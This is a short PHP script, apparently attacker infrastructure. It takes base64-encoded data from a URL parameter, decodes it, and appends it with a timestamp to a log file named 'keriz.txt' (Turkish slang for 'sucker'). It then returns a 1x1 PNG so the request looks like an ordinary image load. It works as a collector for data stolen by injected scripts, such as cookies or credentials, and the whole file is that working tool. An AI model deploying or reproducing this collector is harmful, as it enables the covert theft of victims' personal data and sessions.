<?php

if (isset($_GET['data'])) {
    $gelen_veri = $_GET['data'];

    $cozulmus_veri = base64_decode($gelen_veri);

    $zaman = date('Y-m-d H:i:s');
    $log_mesaji = "[$zaman] Gelen Bilgi: " . $cozulmus_veri . PHP_EOL;

    file_put_contents('keriz.txt', $log_mesaji, FILE_APPEND);
}

header('Content-Type: image/png');
echo base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=');
?>
